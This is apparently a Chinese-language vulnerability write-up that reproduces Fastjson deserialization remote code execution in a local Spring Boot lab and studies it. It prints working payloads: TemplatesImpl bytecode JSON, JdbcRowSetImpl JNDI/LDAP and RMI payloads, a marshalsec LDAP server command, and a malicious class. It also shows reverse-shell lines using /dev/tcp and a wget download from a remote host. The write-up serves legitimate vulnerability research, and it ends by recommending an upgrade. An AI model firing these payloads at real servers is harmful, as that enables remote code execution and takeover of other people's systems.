## Fastjson反序列化漏洞


最近HW行动尾声爆出fastjson javaweb框架0day漏洞，从爆出的详情看，该漏洞应该是延续了17的反序列化漏洞，绕过了设置的黑名单策略，详情参见：  
https://helpcdn.aliyun.com/document_detail/123431.html   
https://github.com/alibaba/fastjson/issues/2500  
(因为最近没有时间研究fastjson补丁详情，网上对于绕过的POC也未公布，故至此学习验证17年出现的反序列化漏洞)

### 1. Fastjson简介
Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端
提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：https://github.com/alibaba/fastjson。  

### 2. 漏洞简介

fastjson在版本<=1.2.24时，@type指定类进行反序列化时存在远程代码执行漏洞。  

### 3. 漏洞验证

PoC分类

1，基于TemplateImpl
2，基于JNDI Bean Property类型
3，基于JNDI Field类型  
使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法，fastjson默认开启type属性。Json 字符串中 @type 要放在最前面，否则没法利用。

	// 反弹shell不能这样写，会没有效果
	Runtime.getRuntime().exec("/bin/bash -i >& /dev/tcp/192.168.10.25/3333 0>&1");
	// 需要写成这样
	// bash -c "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"
	Runtime.getRuntime().exec(
                    new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.85.128/4545 0>&1"});
	// 可以执行
	Runtime.getRuntime().exec("wget http://x.x.x.x:8080/1.py");


**此处基于第一种方式进行验证，基于JDNI的触发方式更方便，但受限于网络，编译marshalsec太慢了**

#### 1. 搭建spring-boot环境（想基于web项目验证）

直接在spring-boot的官网生成maven项目（顺道了解下spring boot环境）  

1）@SpringBootApplication 作为函数入口，最好设置在根package下面，因为只有该Class的下级目录和同目录下的Controller才会被注解解析生效，否则访问http://127.0.0.1:8080/web时会404   
2）开发Web接口时，将Class设置为@RestController，而不是@Controller（可能是未指定具体的）  

#### 2. 配置fastjson 
配置方式参考网上链接，创建HttpConverterConfig类，通过@Configuration设置  

#### 3. 开发web访问的JSON接口，实现接收JSON格式数据
由于开发技能不熟悉，@RequestBody Object是可以将json直接转换成对象的，但是我不确定是否是采用的我们配置的Fastjson convert.  

采用最简单的方式，传递JSON键值对，映射为String对象。 

	//基于 TemplateImpl 的 PoC
	//{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"base64_calss\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}
	//通过postMan提交json格式数据
	@PostMapping("adduser")
	public Object login(@RequestBody Map<String,Object> map){
	//{"json":"{\"name\":\"snowsec0\",\"password\":\"hello world\"}"}
		ParserConfig config = new ParserConfig();
		System.err.println(map.get("json"));
		String str = (String) map.get("json");
		Object user = JSON.parseObject(str,Object.class, config, Feature.SupportNonPublicField);
		return user;
	}

#### 4. 创建Calc类（利用漏洞执行代码的类） 
创建具有执行恶意代码的类，将其编译成class文件，在将Class文件转码成base64格式  
https://www.zhangxinxu.com/sp/base64.html（真希望有个本地的加解密、编解码的工具）  

	package com.snowsec0.tools;
	/*
	 * 待反序列换的对象，构造函数启动MAC计算器
	 * 通过javac编译Java文件，将Calc.class进行BASE64编码
	 * 
	 */
	import java.io.IOException;

	import com.sun.org.apache.xalan.internal.xsltc.DOM;
	import com.sun.org.apache.xalan.internal.xsltc.TransletException;
	import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
	import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
	import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

	//需要继承AbstractTranslet，否则反序列换会失败
	public class Calc extends AbstractTranslet{

		public Calc()
		{
			try {
				Runtime.getRuntime().exec("open /Applications/Calculator.app");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		@Override
		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
			// TODO Auto-generated method stub
		
		}

		@Override
		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
				throws TransletException {
			// TODO Auto-generated method stub
		
		}
	
		public static void main(String[] args)
		{
			Calc calc = new Calc();
		}
	
	}




#### 5. 漏洞执行

能够触发漏洞的POC格式：  
		
	{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"base64_calss\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}

将其中的base64_calss替换成Class编码内容即可：  
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/fastjson%E5%BA%8F%E5%88%97%E5%8C%96/sendpoc.png)  

执行结果如下：  
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/fastjson%E5%BA%8F%E5%88%97%E5%8C%96/pocexec.png)
### 4. JNDI方式验证
1. 独立生成Calc.java，编译成Class文件，并将其部署在自己的web server下，使其能够通过http://ip:port/Calc.class获取到   
2. 利用marshalsec，启动LDAP服务监听：

		java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Calc 
	
3. 在代码中写死POC触发json.parse(),通过postman访问，触发成功

		{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Calc\",\"autoCommit\":true} 

### 6. HW行动纰漏的fastjson无需开启autotype即可利用成功

在hw期间使用的fastjson 漏洞，该漏洞无需开启autoType即可利用成功，建议使用fastjson的用户尽快升级到> 1.2.47版本  

漏洞分析：https://mp.weixin.qq.com/s/N8PpN8Cp6gpVNl9xWEVVcg  

最新的POC： 

	{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
  
最新poc中，通过多重json解析，设置@type为java.lang.Class绕过设置的黑名单，同样利用上述的方式进行验证，验证成功： 

	//直接访问触发
	@RequestMapping("autofast")
	public String autofast()
	{
		String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Calc\",,\"autoCommit\":true}}}";
		JSONObject.parse(payload);
		return "success";
	}

![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/fastjson%E5%BA%8F%E5%88%97%E5%8C%96/20190713exec.png)
		
		
### 7. 漏洞环境地址 

https://github.com/shadow-horse/Vulenvironment/tree/master/springboot-web  

### 参考链接 
http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson%20RCE%20PoC构造与分析/    
https://www.restran.net/2018/10/29/fastjson-rce-notes/  

